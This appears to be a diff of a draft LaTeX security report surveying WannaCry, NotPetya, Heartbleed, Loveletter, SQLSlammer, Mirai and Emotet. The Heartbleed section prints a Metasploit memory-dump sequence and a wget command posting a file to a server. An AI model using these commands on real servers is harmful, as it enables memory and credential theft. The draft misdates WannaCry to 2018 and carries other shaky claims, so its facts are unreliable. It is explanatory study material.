@@ -45,27 +45,134 @@ Some sensible steps include:
 \subsection{Zero-Days}
 When people think of the exploit-update cycle, the first thought would be of patching. Patching is incredibly important, it allows for security issues to be rectified; to an extent in which it's then up to maintenance. Zero day attacks are incredibly 
 potent due to the distinct lack of a patch available. A zero day is essentially a brand new exploit that is suddenly sprung upon the blue team. These exploits can do any amount of damage, with their severity depending on the exploit at hand. 
-Zero days are often sold on the dark net for prices that are in accordance with the severity. Zerodium - A company that tracks the pricing of various kinds of exploits prices a Windows 10 remote code execution exploit at around \$1 million. 
+Zero days are often sold on the dark net for prices that are in accordance with the severity. 
+
+Zerodium - A company that tracks the pricing of various kinds of exploits prices a Windows 10 remote code execution exploit at around \$1 million. 
 The price tag pertains to the huge amount of systems running windows as a base, with an incredibly large surface to implement on.
 
 %reference zerodium, responce stats
 
 \section{Historic \& Modern Malware Threats}
+%does this section need to be after mechanisms or maybe in synthesis for malware choicing? 
+%Do I need to talk about mechanisms more?
+
+%cite eternal blue & mimikatz
+%show red box?
+%reference ransomwear section?
+
+%tried to avoid covering multiple of the same kind
+
+%ref hypponen
+%ref c2
+%ref dos
+
+%much more to do on all of these, get ideas and keep same structure
+
+\subsection{WannaCry \& NotPetya}
+WannaCry is the most famous form of ransomware, which caused chaos for the National Health Service in 2018. It relied on the eternal blue vulnerability to get into systems, a leaked NSA exploit which abused a fault in how SMB 1.0 shares transmitted over the network.
+Wannacry still works on windows 10, however Eternal Blue was patched. 
+
+The malware itself was defeated using a combination of pathcing and reverse engineering. The malware reached out to specific domains for C2 functionality, however this was a partial design error. 
+The domains were assumed by security comapnies and the kill switch was initiated to stop the spread, until new strains came out. The intention, as with other ransomware was two fold. Infrastructure damage and financil incentive for a promise to restore the encrypted files.
+
+Other cryptors have made the rounds, including NotPetya which is under suspsion of being a nation state attack deploying against ukraine by Russia. \citep{notPetya} NotPetya is a modified version of the Petya cryptor, with the major difference being that it is destruction orientated, with no option for a decryption process.
+The other difference being that while it kept the basic payload with modifications, it also used the Eternal Blue vulnerability to spread, much like Wannacry. The improved version also implemented a modified Mimikatz build which is a security suite for testing Windows based authentication systems. In this case,
+it was used to dynamically harvest administrator credentials out of the host's memory. \citep{NotPetya02}
+
 \subsection{Heartbleed}
+A heartbeat request asks for a open ssl session to be checked of a given length and content. 
+The length was never checked though so it would read from outside the buffer potentially revealing passwords. Thousands of webservers were vulnerable, 
+including yahoo. A patch was needed to fix this. It resulted in the ability for an attacker to reveal contents stored in memory, such as credentials and other important information.
+
+The attack is simple, as such a metasploit module is available:
+\begin{tcblisting}{listing only}
+wget --post-file=data https://<serverIP>/index.php --no-check-certificate
+
+use auxiliary/scanner/ssl/openssl_heartbleed
+set rhost <server IP here>set action DUMP
+set verbose true
+exploit
+\end{tcblisting}
+%img of terminal? 
 
 \subsection{Loveletter}
+Love Letter, also known as ILOVEYOU is a worm that circulated in the year 2000. It was an email based malware that uses a VBS script to hijack Outlook, and send then itself to the contacts book. \citep{Loveletter}
+It can be speculated that this was particully potent due to the culture of the internet at the time, where most people who communicated, did it via email. This means that a typical contact book was full enough for this attack to be effective, while also leveraging
+the trust element of the hijacked sender.
 
+Contents \citep{Loveletter}:
+
+The Subject:          ILOVEYOU
+
+Message body:         kindly check the attached LOVELETTER coming from me.
+
+Attached file name:   LOVE-LETTER-FOR-YOU.TXT.vbs
+
+The malware then proceeds to implant itself into the system, and modify the Internet explorer start page to one of foor that hosts a Trojan payload. The Trojan itself is designed to install into registry, just like the stager, and then capture system data to exfiltrate out to the trojan host via email (mailme@super.net.ph). \citep{loveletter}
+
+Information stolen includes:
+Hostname
+IP Address
+Login Information
+
+AutoRun Registry Locations Used \citep{Loveletter}:
+HKLMSoftwareMicrosoftWindowsCurrentVersionRunMSKernel32 
+HKLMSoftwareMicrosoftWindowsCurrentVersionRunServicesWin32DLL 
+
+%tidy up
 \subsection{SQLSlammer}
+SQLSlammer was created in 2003 based off a proof of concept warning from David Litchfield who discovered that by sending single packets to a Microsoft SQL Server (2000) on port 1434, a number of effects can be triggered.
+Most of the data values of the payload would crash the server, but one didn't. \citep{SQLSlammerStory}
 
-\subsection{Emotet}
+David discovered that 0x083A (8:<hostname>) can be used to inject arbitrary data, meaning that there was a buffer to store it. 
+This field was not validated as it expected a pointer, and when given a NULL value, it reacted unpredictably.  \citep{SQLSlammerStory}
 
-\subsection{WannaCry}
+Buffer overflows can lead to binary hijacking if given the right data, in this case a long hostname. This was abused in SQL Slammer that would send single packet malware to port 1434 using some of the code provided by David at a security event.
+This single packet behaviour is called a 'Warhol Worm' and is notable due to the fact it only persists in memory and is a surprising 376 bytes in length. \citep{SQLSlammer} A restart would fix infection, however due to the fact that most of the SQL sercers on the internet of the time was infected by the worm,
+reinfection was likely without patching or firewall rules.
 
-\subsection{NotPetya}
-
-\subsection{Mimikatz}
+The worm created a massive rise in patching culture due to the large amount of infections, and changed how security was viewed by all involved. \citep{SQLSlammerStory}
 
 \subsection{Mirai}
+Mirai was a IOT botnet based worm that circulated in 2016 \citep{Mirai}. The botnet was mainly used in distributed denial of service attacks on various targets to flood their systems to cause outage. At it's peak, it
+had an army of 600,000 devices \citep{Mirai}. These devices are somewhat weak on their own but reached a strength of 1 Terabit per second \citep{Mirai}. The reason this was so impactful was the sheer amount of data that systems had to handle.
+
+\begin{tcblisting}{listing only}
+1 terabit = 125000 Megabyte
+
+125000 / 1.8* = 69444 images pushed per second. 
+\end{tcblisting}
+
+\small{* 1.8 = Average 15 Megapixel Jpeg picture \citep{imgAvg}}
+
+The above shows the scale of that kind of throughput in material terms. In reality, data is arbitrary and only serves to crash the systems that are targeted for attack.
+
+Mirai's Traits \citep{Mirai}:
+\begin{enumerate}
+    \item [$\bullet$] Linux based malware, mainly targeting IOT
+    \item [$\bullet$] Self replicated via telnet scanning for default or well-known credentials
+    \item [$\bullet$] Contacted an internet based C2 server
+    \item [$\bullet$] Utilized HTTP, UDP and TCP flooding DoS techniques
+    \item [$\bullet$] Used against ISPs, Minecraft servers, AntiDDoS services and others.
+\end{enumerate}
+
+\subsection{Emotet}
+Emotet is a modern trojan that is spread via email links and attachments. It has had various version, each having improvement over the last. Typical malcious tactics are implemented such as the exploitation of urgency, curiosity and fear among overs. The malware spreads via email with worm behavior, and like Loveletter, it repopulates via contact book abuse. \citep{Emotet}
+
+The primary goal of the malware is to gain access to the victim's bank account, often accessed through a web browser. Exploits include macro scripting on document execution and Javascript exploitation. Both methods result in a C2 structure in which the attacker can control the actions of the malware. This includes seemless updating of the malware, exfiltration of data and futher payload deployment. \citep{Emotet}
+
+One of the indicators that it is a modern strain of malware (dating back to 2014) is that it has virtual machine detection. \citep{Emotet} The reason why is clear, virtual machines are controlled environments in which malware is often analysed and reverse engineered. VM detection usually comes in the form of a review of the system setup. 
+
+Common indicators include:
+\begin{enumerate}
+    \item Shared folders
+    \item Shared dlipboard
+    \item Unrealistically low RAM
+    \item Fresh desktop environment
+    \item VMware device drivers
+\end{enumerate}
+
+Upon network access, it will try to pivot by conducting brute force and wordlist attacks on nearby services. It is clear that by studying modern malware, that tools and techniques that are historic are implemented in new ways, often in combination with other modern malware.
 
 
 %------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------%
@@ -169,7 +276,8 @@ allows for easier expansion. Blacklisting is more suscepitble to hacking due to 
 highly dependant on systems only having required access, something that when planned properly, can use a whitelist approach. The approach will vary across the network and as such proritization of security 
 and looseness of security for usability must be considered.
 
-%move to syn?
+%\todo{move to syn?}
+
 \subsection{PoC IDS Objectives (It must..)}
 \begin{enumerate}
 	\item \textbf{Detect network interfaces}
